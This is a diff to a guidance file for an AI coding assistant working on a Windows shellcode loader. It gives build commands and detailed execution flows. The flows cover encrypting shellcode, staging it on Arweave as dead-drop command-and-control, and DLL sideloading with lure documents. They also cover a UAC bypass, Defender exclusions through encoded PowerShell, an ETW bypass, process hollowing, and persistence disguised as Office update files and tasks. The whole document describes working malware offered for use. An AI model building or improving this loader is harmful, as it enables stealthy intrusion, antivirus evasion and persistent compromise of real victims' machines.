@@ -6,20 +6,23 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 
 ```bash
 # Step 1: Encrypt shellcode and generate Payload.h (required before every build)
-# --sol-wallet  Solana wallet address whose FIRST (oldest) transaction holds the
-#               on-chain memo: <staging_url>|<32-hex-key>|<24-hex-nonce>
-#               The binary only embeds the wallet address — URL and key live on-chain.
-# --rpc         Optional custom RPC endpoint (default: api.mainnet-beta.solana.com)
-python Encrypt.py <shellcode.bin> --url https://<C2_IP>:<PORT>/payload.dat --sol-wallet <ADDRESS>
-#   → produces: <basename>.dat (encrypted payload), Payload.h, memo.txt
-#   Upload <basename>.dat to your C2, then post the contents of memo.txt as a
-#   Solana memo transaction from <ADDRESS>. build.bat after that.
+# --wallet  Arweave wallet address (43-char base64url) embedded in Payload.h.
+#           The binary only stores the wallet address — key and payload live on Arweave.
+python Encrypt.py <shellcode.bin> --wallet <ARWEAVE_ADDRESS>
+#   → produces: data.enc  (combined format: hex_key|hex_nonce|size|compressed|<binary>)
+#               Payload.h (wallet address XOR-obfuscated, randomized strings/keys)
 
-# Step 2a: Compile as EXE (default)
+# Step 2: Upload data.enc to Arweave (wallet must hold AR tokens)
+python arweave/upload.py data.enc [arweave/wallet.json]
+#   → returns TX ID; confirmation takes 10-30 min
+#   The loader finds the TX via GraphQL (owners filter + App-Name=zero-loader tag)
+#   and extracts key/nonce from the embedded header — no rebuild needed after upload.
+
+# Step 3a: Compile as EXE (default)
 build.bat                                    # no UAC prompt
 build.bat uac                                # embeds requireAdministrator manifest
 
-# Step 2b: Compile as DLL sideload variant
+# Step 3b: Compile as DLL sideload variant
 python SideloadGen.py <target.dll> [--rename <new_name>] [--exe <host.exe>]
 build.bat sideload [output_name.dll]         # no elevation
 build.bat sideload [output_name.dll] uac     # self-relaunch for UAC
@@ -28,7 +31,7 @@ build.bat sideload [output_name.dll] uac     # self-relaunch for UAC
 # Go/Sliver shellcode: uncomment '#define RWX_SHELLCODE' in Common.h
 ```
 
-Build pipeline (EXE): `ml64 AsmStub.asm` → `cl *.c AsmStub.obj` → `python Mutate.py WUAssistant.exe`
+Build pipeline (EXE): `ml64 AsmStub.asm` → `cl *.c AsmStub.obj` → `python Mutate.py OfficeUpdate.exe`
 
 Build pipeline (DLL sideload): `SideloadGen.py <target.dll>` → `ml64 AsmStub.asm` → `cl /DBUILD_DLL *.c Sideload.c AsmStub.obj /DLL` → `python Mutate.py sideload.dll`
 
@@ -45,7 +48,7 @@ IatCamouflage → AntiAnalysis → AntiEmulation
 → InitializeNtSyscalls (single-pass over ntdll exports, clean SSNs from \KnownDlls\ntdll.dll)
 → InitializeWinApis (case-insensitive PEB walk via FindLoadedModuleW)
 → BlindDllNotifications → ShufflePreloadLibraries (RDTSC Fisher-Yates order)
-→ PatchlessAmsiEtw (VEH + HW breakpoints) → BruteForceDecryption
+→ PatchlessEtw (VEH + HW breakpoints) → BruteForceDecryption
 → DownloadPayload → ChaskeyCtrDecrypt → [DecompressPayload]
 → ModuleStomp (allowlist + synthetic RUNTIME_FUNCTION via RtlAddFunctionTable)
   → GhostlyHollow (FILE_FLAG_DELETE_ON_CLOSE + SEC_IMAGE, no NTFS transaction)
@@ -66,60 +69,69 @@ The primary kick-off is user-mode fibers on the main thread — no new OS thread
 
 Four build types × two run types (first run vs persistence reboot). Persistence mechanism differs by build type — **UAC builds use a scheduled task; non-UAC builds use a registry run key**.
 
+On **first run** all builds: copy files → register persistence → launch persistence process → `NtTerminateProcess` (no download, no shellcode).
+On **persistence reboot** all builds: self-guard fires → skip install entirely → download → decrypt → shellcode.
+
 ---
 
 #### EXE (non-UAC) — `build.bat`
 
-**First run** (`WUAssistant.exe`, any IL):
+**First run** (dropper EXE, any IL):
 ```
-Main() → evasion stack → FetchSolMemo → download → decrypt → place shellcode
-→ CleanupEvasion
-→ InstallPersistence → HKCU\...\Run "WUAssistant" = "C:\...\WUAssistant.exe"
-→ fiber / thread-pool → shellcode
+Main() → evasion stack
+→ InstallAndTerminate():
+    self-guard: basename != "msoia.exe" → proceed
+    InstallPersistence → HKCU\...\Run "OfficeUpdate" = "%APPDATA%\...\msoia.exe"
+    CreateDirectoryA %APPDATA%\Microsoft\Office\Updates\
+    CopyFileA self → msoia.exe
+    CreateProcessW(msoia.exe)
+    NtTerminateProcess(self)         ← exits here, never touches network
 ```
 
-**Persistence run** (HKCU run key fires at logon, medium IL):
+**Persistence reboot** (`msoia.exe`, HKCU run key fires at logon, medium IL):
 ```
-Same as first run — InstallPersistence re-writes the key on every execution (no-op).
-Lure: none (EXE build has no bind file).
+Main() → evasion stack
+→ InstallAndTerminate():
+    self-guard: basename == "msoia.exe" → return immediately
+→ FetchArweaveMeta → download → decrypt → place shellcode → CleanupEvasion
+→ shellcode runs
 ```
 
 ---
 
 #### EXE UAC — `build.bat uac`
 
-**First run** (`WUAssistant.exe`, medium IL):
+**First run** (dropper EXE, medium IL):
 ```
 Main() → evasion stack
-→ UacBypass(): IsFirstRunProcess=TRUE, IsInstallMode=FALSE
-  → AppInfo RPC bypass (AicLaunchAdminProcess winver + ComputerDefaults)
-  → SpawnChildOfParent: launch "WUAssistant.exe --install" as child of elevated ComputerDefaults
-  → NtTerminateProcess(self)                          ← medium-IL process exits here
+→ UacBypass(): medium IL, basename != "msoia.exe"
+    AppInfo RPC bypass → spawn elevated self → NtTerminateProcess(self)
+    return FALSE → Main() returns 0   ← exits here
 ```
 
-**Elevated install run** (`WUAssistant.exe --install`, high IL — spawned by bypass):
+**Elevated install run** (dropper EXE elevated, high IL — spawned by bypass):
 ```
 Main() → evasion stack
-→ UacBypass(): IsInstallMode=TRUE → returns TRUE
-→ IsFirstRunProcess()=TRUE → InstallAndTerminate():
-    RunWdExclude (PS -EncodedCommand, elevated via AppInfo):
+→ UacBypass(): already elevated → return TRUE
+→ IsFirstRunProcess(): basename != "msoia.exe" → TRUE
+→ InstallAndTerminate():
+    RunWdExclude (PS -EncodedCommand via AppInfo parent-spoof):
       Add-MpPreference -ExclusionPath (full path chain + msoia.exe)
       Register-ScheduledTask 'Office Telemetry Agent'
         -Trigger AtLogon  -Principal RunLevel Highest  -Action msoia.exe
     Sleep(8000)
     CopyFileA self → %APPDATA%\Microsoft\Office\Updates\msoia.exe
-    NtTerminateProcess(self)                           ← install process exits here
+    RunTaskViaCom → launch task immediately (msoia.exe at high IL)
+    NtTerminateProcess(self)         ← exits here, never touches network
 ```
 
-**Persistence run** (`msoia.exe`, high IL — scheduled task fires at logon):
+**Persistence reboot** (`msoia.exe`, scheduled task fires at logon, high IL):
 ```
 Main() → evasion stack
-→ UacBypass(): IsFirstRunProcess()=FALSE (filename == msoia.exe) → returns TRUE
-→ IsFirstRunProcess()=FALSE → skip InstallAndTerminate
-→ FetchSolMemo → download → decrypt → place shellcode
-→ CleanupEvasion
-→ [UAC_BYPASS defined → InstallPersistence NOT called]
-→ fiber / thread-pool → shellcode
+→ UacBypass(): basename == "msoia.exe" → return TRUE immediately
+→ IsFirstRunProcess(): FALSE → skip InstallAndTerminate
+→ FetchArweaveMeta → download → decrypt → place shellcode → CleanupEvasion
+→ shellcode runs
 ```
 
 ---
@@ -131,24 +143,31 @@ Main() → evasion stack
 DllMain → InstallExitHook (patches RtlExitUserProcess → infinite PAUSE)
 → TpAllocWork(SideloadWorker) → host EXE continues normally
 SideloadWorker:
-  [no REQUIRE_ELEVATION — no elevation check]
+  [no REQUIRE_ELEVATION]
   → LdrAddRefDll (pin proxy DLL)
-  → OpenBindFile  (ShellExecuteA lure doc from _\ folder)
-  → Main() → evasion stack → FetchSolMemo → download → decrypt → place shellcode
-  → CleanupEvasion
-  → InstallPersistence → HKCU\...\Run "WUAssistant" = "<host.exe> /pf"
-  → fiber / thread-pool → shellcode
+  → OpenBindFile (open lure doc — no /pf in cmdline)
+  → Main() → evasion stack
+    → SideloadInstallAndContinue():
+        self-guard: no /pf in cmdline → proceed
+        InstallPersistence → HKCU\...\Run "OfficeUpdate" = "%APPDATA%\...\msoia.exe /pf"
+        CreateDirectoryA %APPDATA%\Microsoft\Office\Updates\
+        CopyFileA host EXE → msoia.exe
+        CopyFileA *.dll    → dest dir
+        CreateProcessW("msoia.exe /pf")
+        NtTerminateProcess(self)     ← exits here, never touches network
 ```
 
-**Persistence run** (HKCU run key fires at logon, `/pf` arg, medium IL):
+**Persistence reboot** (`msoia.exe /pf`, HKCU run key fires at logon, medium IL):
 ```
 DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
 SideloadWorker:
-  [no REQUIRE_ELEVATION]
   → LdrAddRefDll
-  → OpenBindFile: detects /pf in command line → skips lure
-  → Main() → evasion stack → ... → shellcode
-  → InstallPersistence (re-writes HKCU key, no-op)
+  → OpenBindFile: /pf detected → skip lure
+  → Main() → evasion stack
+    → SideloadInstallAndContinue():
+        self-guard: /pf in cmdline → return immediately
+    → FetchArweaveMeta → download → decrypt → place shellcode → CleanupEvasion
+    → shellcode runs
 ```
 
 ---
@@ -160,51 +179,51 @@ SideloadWorker:
 DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
 SideloadWorker:
   bPersistBoot=FALSE, IsElevated()=FALSE
-  → RelaunchElevatedAppInfo() — AppInfo RPC bypass (no UAC dialog)
-    → SpawnChildOfParent: relaunch host EXE elevated
-  → NtTerminateProcess(self)                          ← medium-IL instance exits
+  → RelaunchElevatedAppInfo() (AppInfo RPC bypass, no UAC dialog)
+    → spawn host EXE elevated
+  → NtTerminateProcess(self)         ← medium-IL exits here
 ```
 
-**Elevated first run** (host EXE elevated, proxy DLL loaded again):
+**Elevated first run** (host EXE elevated, proxy DLL loads again, high IL):
 ```
 DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
 SideloadWorker:
   bPersistBoot=FALSE, IsElevated()=TRUE
-  → SideloadInstallAndContinue():
-      Add-MpPreference -ExclusionPath (full path chain + msoia.exe)  [PS -EncodedCommand via AppInfo]
-      Register-ScheduledTask 'Office Telemetry Agent'
-        -Trigger AtLogon  -Principal RunLevel Highest  -Action "msoia.exe" -Argument "/pf"
+  → SideloadInstallAndContinue() [UAC_BYPASS path, called from Sideload.c]:
+      RunWdExclude (PS -EncodedCommand via AppInfo parent-spoof):
+        Add-MpPreference -ExclusionPath (full path chain + msoia.exe)
+        Register-ScheduledTask 'Office Telemetry Agent'
+          -Trigger AtLogon  -Principal RunLevel Highest  -Action msoia.exe  -Argument "/pf"
       Sleep(8000)
       CopyFileA host EXE → %APPDATA%\Microsoft\Office\Updates\msoia.exe
       CopyFileA *.dll    → %APPDATA%\Microsoft\Office\Updates\
-      Start-ScheduledTask 'Office Telemetry Agent'      ← beacon starts immediately via scheduler
-  → NtTerminateProcess(self)                           ← elevated install process exits
+      RunTaskViaCom → launch task immediately (msoia.exe /pf at high IL)
+      NtTerminateProcess(self)       ← exits here, never touches network
 ```
 
-**Persistence run** (`msoia.exe /pf`, high IL — scheduled task fires at logon):
+**Persistence reboot** (`msoia.exe /pf`, scheduled task fires at logon, high IL):
 ```
 DllMain → InstallExitHook → TpAllocWork(SideloadWorker)
 SideloadWorker:
-  bPersistBoot=TRUE (detects /pf in command line)
+  bPersistBoot=TRUE (/pf detected)
   → skip elevation check + skip SideloadInstallAndContinue
   → LdrAddRefDll
-  → OpenBindFile: detects /pf → skips lure
-  → Main() → evasion stack → FetchSolMemo → download → decrypt → place shellcode
-  → CleanupEvasion
-  → [UAC_BYPASS defined → InstallPersistence NOT called]
-  → fiber / thread-pool → shellcode
+  → OpenBindFile: /pf detected → skip lure
+  → Main() → evasion stack
+    → FetchArweaveMeta → download → decrypt → place shellcode → CleanupEvasion
+    → shellcode runs
 ```
 
 ---
 
 **Persistence summary by build type:**
 
-| Build        | Mechanism      | Key / Task name          | Root | IL at reboot            |
-|--------------|----------------|--------------------------|------|-------------------------|
-| EXE          | HKCU Run key   | `WUAssistant`            | HKCU | Medium                  |
-| EXE UAC      | Scheduled task | `Office Telemetry Agent` | —    | High (RunLevel Highest) |
-| Sideload     | HKCU Run key   | `WUAssistant`            | HKCU | Medium                  |
-| Sideload UAC | Scheduled task | `Office Telemetry Agent` | —    | High (RunLevel Highest) |
+| Build        | Registered on  | Mechanism      | Key / Task name          | IL at reboot            |
+|--------------|----------------|----------------|--------------------------|-------------------------|
+| EXE          | First run      | HKCU Run key   | `OfficeUpdate`           | Medium                  |
+| EXE UAC      | First run      | Scheduled task | `Office Telemetry Agent` | High (RunLevel Highest) |
+| Sideload     | First run      | HKCU Run key   | `OfficeUpdate`           | Medium                  |
+| Sideload UAC | First run      | Scheduled task | `Office Telemetry Agent` | High (RunLevel Highest) |
 
 ### Module Responsibilities
 
